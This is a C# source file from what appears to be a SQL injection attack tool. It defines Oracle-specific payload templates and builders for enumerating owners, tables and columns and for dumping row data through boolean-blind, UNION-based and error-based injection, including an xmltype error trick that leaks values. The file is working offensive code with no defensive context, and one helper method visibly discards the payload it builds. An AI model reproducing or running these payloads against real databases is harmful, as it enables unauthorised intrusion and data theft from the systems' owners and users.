using System;
using System.Collections.Generic;
using System.Text;
using tools;

namespace SuperSQLInjection.payload
{
    class Oracle
    {
        //加载对应配置(需要读取的环境变量)
        public static String path = "config/oracle/ver.txt";
        public static List<String> vers = FileTool.readFileToList(path);


        public static String err_hex_len = "(select length(rawtohex({data})) from dual)";

        //数据库数量
        public static String dbs_count = "(select count(distinct(owner)) from sys.all_tables)";
        //表数量
        public static String tables_count = "(select count(*) from sys.all_tables where owner='{dbname}')";
        //列数量
        public static String columns_count = "(select count(*) from sys.all_tab_columns where owner='{dbname}' and table_name='{table}')";


        //获取数据库名
        public static String db_value = "(select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit={index})";
        //获取表名称
        public static String table_value = "(select table_name from (select table_name,rownum as limit from (select table_name from sys.all_tables where owner='{dbname}')) where limit={index})";
        //获取列名称
        public static String column_value = "(select column_name from (select column_name,rownum as limit from (select column_name from sys.all_tab_columns where owner='{dbname}' and table_name='{table}')) where limit={index})";





        //获取数据库数量bool方式
        public static String bool_db_count = " " + dbs_count + ">{len}";
        //获取表数量bool
        public static String bool_tables_count = " " + tables_count + ">{len}";
        //获取列数量bool
        public static String bool_columns_count = " " + columns_count + ">{len}";
        


        public static String substr = "substr(({data})),{index},1)";
        //多字节
        public static String hex_value = "rawtohex(substr({data},{index},1))";
        
        //bool方式字符长度判断
        public static String bool_length = " length({data})>{len}";

        //bool方式获取值
        public static String bool_value = " ascii(substr({data},{index},1))>{len}";

        //获取行数据
        public static String data_value = "(select {data} from (select {allcolumns},rownum as limit from {dbname}.{table})  where limit={index})";


        //union获取数据条数
        public static String union_data_count = "(select count(*) from {dbname}.{table})";
        public static String bool_datas_count = " " + union_data_count + ">={len}";

        //union获取值
        public static String union_value = " 1=2 union all select {data} from dual";

        //error方式
        public static String error_value = " 1=(select upper(xmltype(chr(60)||chr(58)||chr(45)||chr(45)||chr(58)||rawtohex(cast(({data}) as varchar(256)))||chr(58)||chr(45)||chr(45)||chr(62))) from dual)";

        public static String substr_error_value = " 1=(select upper(xmltype(chr(60)||chr(58)||chr(45)||chr(45)||chr(58)||substr(rawtohex(cast(({data}) as varchar(256))),{start},{len})||chr(58)||chr(45)||chr(45)||chr(62))) from dual)";

        public static String getUnionDataValue(int columnsLen, int showIndex, String dataPayLoad, String dbname, String table, String index)
        {
            StringBuilder sb = new StringBuilder();
            
            for (int i = 1; i <= columnsLen; i++)
            {
                if (i == showIndex)
                {
                    sb.Append("(chr(94)||chr(94)||chr(33)||"+dataPayLoad.Replace("{dbname}", dbname).Replace("{table}", table).Replace("{index}", index) + "||chr(33)||chr(94)||chr(94)),");
                }
                else
                {
                    sb.Append("null,");
                }
            }
            sb.Remove(sb.Length - 1, 1);
            return union_value.Replace("{data}", sb.ToString());
        }

        public static String getUnionDataValue(int columnsLen, int showIndex, List<String> columns, String dbname, String table, String index)
        {
            StringBuilder sb = new StringBuilder();
            String data = "chr(94)||chr(94)||chr(33)||" + Comm.unionColumns(columns, "||chr(36)||chr(36)||chr(36)||") + "||chr(33)||chr(94)||chr(94)";
            for (int i = 1; i <= columnsLen; i++)
            {
                if (i == showIndex)
                {
                    sb.Append(data_value.Replace("{data}", data).Replace("{allcolumns}", Comm.unionColumns(columns, ",")).Replace("{dbname}", dbname).Replace("{table}", table).Replace("{index}", index));
                    sb.Append(",");
                }
                else
                {
                    sb.Append("null,");
                }
            }
            sb.Remove(sb.Length - 1, 1);
            return union_value.Replace("{data}", sb.ToString());
        }

        public static String getErrorDataValue(String dataPayLoad, String dbname, String table, String index)
        {
            String data=dataPayLoad.Replace("{dbname}", dbname).Replace("{table}", table).Replace("{index}", index);
            return error_value.Replace("{data}", data);
        }

       

        public static String getErrorDataLen(List<String> columns, String dbname, String table, String index)
        {
            return err_hex_len.Replace("{data}", getDataValue(columns, dbname, table, index));
        }

        public static String unionCastColumns(List<String> columns, String unionStr)
        {
            StringBuilder sb = new StringBuilder();
            foreach (String column in columns)
            {

                sb.Append("cast(" + column + " as varchar(4000))" +unionStr);
            }
            sb.Remove(sb.Length - unionStr.Length, unionStr.Length);
            return sb.ToString();
        }

        /// <summary>
        /// 值的长度
        /// </summary>
        /// <param name="dataPayload"></param>
        /// <returns></returns>
        public static String getBoolLengthPayLoad(String dataStr, int len)
        {

            bool_length.Replace("{data}", hex_value.Replace("{data}", dataStr)).Replace("{len}", len.ToString());

            return dataStr;
        }

        /// <summary>
        /// 获得bool方式值payload
        /// </summary>
        /// <param name="dataStr">对应值的查询SQL</param>
        /// <param name="dbName">数据库名</param>
        /// <param name="table">表名</param>
        /// <param name="index">下标</param>
        /// <returns></returns>
        public static String getBoolDataPayLoad(String column, String dbName, String table, int index)
        {
            String payload = data_value.Replace("{data}", column).Replace("{allcolumns}", column).Replace("{dbname}", dbName).Replace("{table}", table).Replace("{index}", index.ToString());
            return payload;
        }

        public static String getDataValue(List<String> columns, String dbName, String table, String index)
        {
            StringBuilder sb = new StringBuilder();
            String data = Comm.unionColumns(columns, "||chr(36)||chr(36)||chr(36)||");
            sb.Append(data_value.Replace("{data}", data).Replace("{allcolumns}", Comm.unionColumns(columns, ",")).Replace("{dbname}", dbName).Replace("{table}", table).Replace("{index}", index));
            sb.Append(",");
            sb.Remove(sb.Length - 1, 1);
            return sb.ToString();
        }

    }
}
